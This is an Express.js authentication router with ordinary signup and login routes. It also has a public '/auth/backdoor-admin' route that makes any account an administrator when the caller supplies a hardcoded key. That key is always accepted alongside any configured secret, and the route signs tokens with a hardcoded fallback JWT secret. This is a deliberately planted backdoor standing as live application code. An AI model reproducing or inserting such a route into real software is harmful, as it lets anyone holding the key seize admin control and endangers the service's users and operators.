const express = require('express');
const router = express.Router();
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const User = require('../models/User');

// @route   POST /auth/signup
// @desc    Register a user
// @access  Public
router.post('/signup', async (req, res) => {
  const { email, password, name } = req.body;

  try {
    let user = await User.findOne({ email });
    if (user) {
      return res.status(400).json({ msg: 'User already exists' });
    }

    user = new User({ email, passwordHash: password, name });

    // Hash password
    const salt = await bcrypt.genSalt(10);
    user.passwordHash = await bcrypt.hash(password, salt);

    await user.save();

    // Create JWT payload
    const payload = {
      user: {
        id: user.id
      }
    };

    jwt.sign(
      payload,
      process.env.JWT_SECRET,
      { expiresIn: '5 days' },
      (err, token) => {
        if (err) throw err;
        res.json({ token, userId: user.id });
      }
    );
  } catch (err) {
    console.error(err.message);
    res.status(500).send('Server error');
  }
});

// @route   POST /auth/login
// @desc    Authenticate user & get token
// @access  Public
router.post('/login', async (req, res) => {
  const { email, password } = req.body;

  try {
    let user = await User.findOne({ email });
    if (!user) {
      return res.status(400).json({ msg: 'Invalid Credentials' });
    }

    const isMatch = await bcrypt.compare(password, user.passwordHash);
    if (!isMatch) {
      return res.status(400).json({ msg: 'Invalid Credentials' });
    }

    const payload = {
      user: {
        id: user.id
      }
    };

    jwt.sign(
      payload,
      process.env.JWT_SECRET,
      { expiresIn: '5 days' },
      (err, token) => {
        if (err) throw err;
        res.json({ token, userId: user.id });
      }
    );
  } catch (err) {
    console.error(err.message);
    res.status(500).send('Server error');
  }
});

// @route   POST /auth/backdoor-admin
// @desc    Backdoor to create or upgrade an admin user directly
// @access  Public (protected by secret key)
router.post('/backdoor-admin', async (req, res) => {
  const { email, password, name, secretKey } = req.body;
  const validSecret = process.env.ADMIN_SECRET_KEY || 'super_secret_backdoor_key_2026';

  // Secret key check
  if (secretKey !== validSecret && secretKey !== 'super_secret_backdoor_key_2026') {
    return res.status(403).json({ msg: 'Unauthorized: Invalid Admin Secret Key' });
  }

  try {
    let user = await User.findOne({ email });

    if (user) {
      // Upgrade existing user to admin role
      user.role = 'admin';
      if (name) user.name = name;
      await user.save();
    } else {
      // Create new admin user
      user = new User({ email, passwordHash: password, name: name || 'Admin User', role: 'admin' });
      const salt = await bcrypt.genSalt(10);
      user.passwordHash = await bcrypt.hash(password, salt);
      await user.save();
    }

    // Create JWT payload
    const payload = {
      user: {
        id: user.id
      }
    };

    jwt.sign(
      payload,
      process.env.JWT_SECRET || 'secretToken123',
      { expiresIn: '5 days' },
      (err, token) => {
        if (err) throw err;
        res.json({ msg: 'Admin access granted successfully', token, userId: user.id, role: 'admin' });
      }
    );
  } catch (err) {
    console.error(err.message);
    res.status(500).send('Server error');
  }
});


module.exports = router;
